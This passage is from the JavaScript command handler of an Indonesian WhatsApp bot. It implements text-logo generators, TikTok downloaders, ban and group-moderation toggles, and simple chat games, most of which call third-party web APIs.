				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'jadwaltv':
				if (isBanned) return reply(mess.ban)	                                
					ngtod = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolkey}`)
					reply(`*Jadwal Tv Hari Ini*\n*ANTV* : ${ngtod.result.antv}\n*GTV* : ${ngtod.result.gtv}\n*INDOSIAR* : ${ngtod.result.indosiar}\n*KOMPASTV* : ${ngtod.result.kompastv}\n*INEWSTV* : ${ngtod.result.inewstv}\n*MNCTV* : ${ngtod.result.mnctv}\*RCTI* : ${ngtod.result.rcti}\n*SCTV* : ${ngtod.result.sctv}\n*TRANSTV* : ${ngtod.result.transtv}\n*TVRI* : ${ngtod.result.tvri}\n*TRANS7* : ${ngtod.result.trans7}\n*NETTV* : ${ngtod.result.nettv}`)
				break
				case 'covidglobal':
				if (isBanned) return reply(mess.ban)	                                
					ngtod = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
					reply(`*Total corona global*\n*Positif* : ${ngtod.result.positif}\n*Sembuh* : ${ngtod.result.sembuh}\n*Dirawat* : ${ngtod.result.dirawat}\n*Meninggal* : ${ngtod.result.meninggal}`)
				break
				case 'covidindo':
				if (isBanned) return reply(mess.ban)	                                
					ngtod = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
					reply(`*Hari Ini Total covid di indonesia*\n*Positif covid* : ${ngtod.result.positif}\n*Sembuh* : ${ngtod.result.sembuh}\n*Dirawat* : ${ngtod.result.dirawat}\n*Meninggal* : ${ngtod.result.meninggal}`)
				break
				case 'translate':
				if (isBanned) return reply(mess.ban)	
                if (args.length < 1) return reply('krim perintah cuaca nama kota')
                teks = q
					anu = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/id?apikey=${lolkey}&text=${q}`)
					reply(`*Message* : ${anu.result.original}\n*Translate* : ${anu.result.pronunciation}`)
				break
				case 'cuaca':
				if (isBanned) return reply(mess.ban)	
                if (args.length < 1) return reply('krim perintah cuaca nama kota')
                teks = q
					anu = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${q}?apikey=${lolkey}`)
					reply(`*Tempat* : ${anu.result.tempat}\n*Cuaca* : ${anu.result.cuaca}\n*Angin* ${anu.result.angin}\n*Kelembapan* : ${anu.result.kelembapan}\n*Suhu* ${anu.result.suhu}\n*Permukaan_Laut* : ${anu.result.permukaan_laut}\n*Latitude* : ${anu.result.latitude}\n*Longitude* : ${anu.result.longitude}`)
				break										
				case 'artinama':
				if (isBanned) return reply(mess.ban)	
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break								
					case 'shutdown':
					if (isBanned) return reply(mess.ban)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return itsmevall.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'ceritapendek':
				case 'cerpen':
				if (isBanned) return reply(mess.ban)	
                    reply(mess.wait)
					anu = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
					reply(`*Ceritapendek* ${anu.result.title}\n*Creator* ${anu.result.creator}\n*Cerita* ${anu.result.cerpen}`)
				break
      case "delcmd":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (!isQuotedSticker)
          return grupinv(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        case 'ban':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				bnnd = body.slice(5)
				ban.push(`${args[0].replace('@','')}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
case 'unban':  
					
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
					delp = body.slice(7)
					ban.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					reply(`Berhasil Menghapus wa.me/${delp} dari banned`)
					break
case 'listban':
		case 'banlist'://By M4N1K
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					teks = '*List Ban:*\n\n'
					for (let manikgans of ban) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${ban.length}*`
					itsmevall.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": ban } })
					break
        // banchat fixed by itsmevall
case 'banchat':
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot tidak aktif di chat ini`)
break

case 'unbanchat':
if (!itsMe && !isOwner)return reply('Only Owner')
if (!isBanchat) return reply(`udah di UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah aktif di chat ini`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await itsmevall.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
//// PEMBATAS MENU WAR \\\
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return fakegroup('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autoketik':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return grupinv('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break

case 'autoread':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
grupinv(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
grupinv(`Succes mematikan autoread pc`)
} else {
grupinv(`Pilih on atau off`)
}
} else {
grupinv(`*List Auto Read*\n•> gc\n•> pc`)
}
break
              case '#dc':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await itsmevall.groupMetadata(anu)
				itsmevall.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
				  case 'leave':
				  case 'endgc':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins && !mek.key.fromMe) return grupinv('Only Admin');
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				itsmevall.updatePresence(from, Presence.composing)
				itsmevall.groupLeave(from)
						break					
case 'blackpink':                
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Kurr Xd`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `nih`, quoted : mek})
                    })
                    limitAdd(sender, limit)
                    break
                    case 'pornhub':                
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} tolol`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `nih`, quoted : mek})
                    })
                    limitAdd(sender, limit)
                    break
//══════════[ FITUR MAKER ]══════════//

//----> 1 TEXT <----//

case 'blackpink':
case 'halloween':
case '3dgradient':
case 'naturalleaves':
case 'dropwater':
case 'blood':
case 'blood2':
case 'neondevil':
case 'neon':
case 'neonlight':
case 'neonlight2':
case 'neonlight3':
case 'greenneon':
case 'toxic':
case 'matrix':
case 'thunder':
case 'thunder2':
case 'bokeh':
case 'carbontext':
case 'christmas':
case 'breakwall':
case 'roadwarning':
case 'engraved3d':
case 'embossed':
case 'writefoggy':
case '3dstone':
case 'futuristic':
case 'asketch':
case 'bluecircuit':
case 'space':
case 'amagmahot':
case 'artpapercut':
case '3dluxurygold':
case 'robotr2d2':
case 'harrypotter':
case 'glitch3':
case 'greenhorrorstyle':
case '3ddeepseametal':
case 'leddisplayscreen':
case 'wonderfulgraffitiart':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
reply(mess.wait)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/${command}?apikey=${dhakey}&text=${teks}`)
oke = await getBuffer(anu.result)
itsmevall.sendMessage(from, oke, image, {quoted: mek, caption: '*Nih Tot Dah Jadi*'})
limitAdd(sender, limit)
break
      case "autojoin":
        if (!isGroup) return grupinv("Khusus di grup");
        if (!mek.key.fromMe) return grupinv("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return grupinv("Sudah aktif!!");
          autojoin = true;
          grupinv("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          grupinv("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return grupinv("Khusus admin");
        if (!isBotGroupAdmins) return reply('Bot Harus Jadi admin tot')
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        limitAdd(sender, limit)
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return grupinv("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
//Maker
case 'rainbow': case 'scfi': case 'blue': case 'juice': case 'purple': case 'toxic': case 'peridot': case 'metal': 
			case 'realistic': case 'impressive': case 'cracked': case 'magma': case 'thunder': case 'berry': case 'transformer': 
			case 'horror': case 'metallic': case 'circuit': case 'sketch': case 'halloween': 
			if (!q) return
			reply(mess.wait)						
			nyz5 = await fetchJson(`https://myselfff.herokuapp.com/docs/textpro/${command}?text=${q}`) 
			nyz4 = await getBuffer(nyz5.result)
			itsmevall.sendMessage(from, nyz4, image, {caption:`NIH KAK`,quoted:mek}) 					
			break
      //------------------< Fitur Grup >-------------------
      case "listonline":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(itsmevall.chats.get(id).presences),
            itsmevall.user.jid,
          ];
          itsmevall.reply(
            m.chat,
            "┌─〔 Daftar Online 〕\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n└────",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
         } catch (e) {
          m.reply("");
        }
        limitAdd(sender, limit)
        break;
case 'tiktod':
case 'tiktokdl':       
case 'tiktok':
case 'tiktokwm':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)					
                if(!q)return reply(`Example : ${prefix + command} link Tiktok`)
                if (!q.includes('tiktok.com')) return reply('Itu bukan link Tiktok')
                await reply(mess.wait)
				xa.Tiktok(`${q}`).then(async (data) => {
                    let txt = `*----「 TIKTOK DOWNLOAD 」----*\n\n`
                    txt += `*• Title :* ${data.title}\n`
                    txt += `*• Duration :* ${data.duration}\n`
					txt += `*• Quality :* ${data.medias[1].quality}\n`
					txt += `*• Ext :* ${data.medias[0].extension}\n`
                    txt += `*• Size :* ${data.medias[0].formattedSize}\n`
                    txt += `*• Url  :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar, sedang proses pengiriman...*`
                    halo = await getBuffer(data.medias[1].url);                    
                    buttons = [{buttonId: `${prefix}tiktokaudio ${q}`,buttonText:{displayText: `TiktokMisic ( ${data.medias[1].formattedSize} )`},type:1},{buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `TiktokNowm ( ${data.medias[0].formattedSize} )`},type:1}]
              videoMsg = (await itsmevall.prepareMessageMedia(halo, "videoMessage", { thumbnail: halo, })).videoMessage
              buttonsMessage = {footerText:'© REALZIBOT', videoMessage: videoMsg,
              contentText:`${txt}`,buttons,headerType:5}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              itsmevall.relayWAMessage(prep)          
					})
                .catch((err) => {
                    reply(`Server Erorr`)
                })
                limitAdd(sender, limit)
                break
            case '#tiktoknowm':                   
case 'tiktoknowm':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isPremium && !isOwner && !mek.key.fromMe) return reply(mess.prem)
			if (!q) return reply('Linknya?')
			if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
			reply(mess.wait)
			let wem = args.join(' ')
			hx.ttdownloader(wem)
			.then(result => {
				const { wm, nowm, audio } = result
				axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
				.then(async (a) => {
					me = `*Link* : ${a.data}`
					weem = await getBuffer(wm)
					itsmevall.sendMessage(from, weem, video, {mimetype: 'video/mp4', quoted: mek})
					})
				}).catch((err) => reply(`Link tidak valid`))
				limitAdd(sender, limit)
			break
			case 'tiktokaudio':
  case 'tiktokmusic':
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (isBanned) return reply(mess.ban)
  if (!isUrl(args[0]) && !args[0].includes('tiktok')) return reply('Link Error')
  buffer = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${args[0]}`)
  itsmevall.sendMessage(from, buffer, MessageType.document, {mimetype: 'audio/mp4',filename: `Tiktok Music.mp3`,quoted: mek})
  limitAdd(sender, limit)
  break
case 'tiktokwmtol':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!q) return reply('Linknya?')
			if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
			reply(mess.wait)
anu = await fetchJson (`https://docs-jojo.herokuapp.com/api/tiktok_nowm?url=${args.join(' ')}`)
buffer = await getBuffer(anu.download)
itsmevall.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek})
			 limitAdd(sender)
             break   
case 'wiki': case 'wikipedia':
  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
reply(mess.wait)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
limitAdd(sender, limit)
break
case 'remlogo':
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
          if (!isRegistered) return reply (mess.banned)
                if (args.length == 0) return grupinv(`Example: ${prefix + command} BotIndo`)
                    txt = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=${hardikey}&text=${txt}`)
                    itsmevall.sendMessage(from, buffer, image, { quoted: mek, caption: mess.success})
                    limitAdd(sender, limit)
                    break
                    case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
              break
case 'family100':
if (isBanned) return reply(mess.ban)
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit Lo Abis Tot`)
memek = fs.readFileSync('./lib/family100.js');
fami = JSON.parse(memek);
ly100 = Math.floor(Math.random() * fami.length);
randKey = fami[ly100];
Pertanyaan = randKey.result.soal
setTimeout( () => {
itsmevall.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
}, 30000) // 1000 = 1s,
setTimeout( () => {
reply('_Waktu Anda Habis_')
}, 29000)
setTimeout( () => {
itsmevall.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
itsmevall.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
itsmevall.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s,
setTimeout( () => {
itsmevall.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
}, 0) // 1000 = 1s,
limitAdd(sender, limit)
break
       case 'tebakanime':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakchara?apikey=${lolkey}`)
              get_result = get_result.result
              ini_image = get_result.image
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
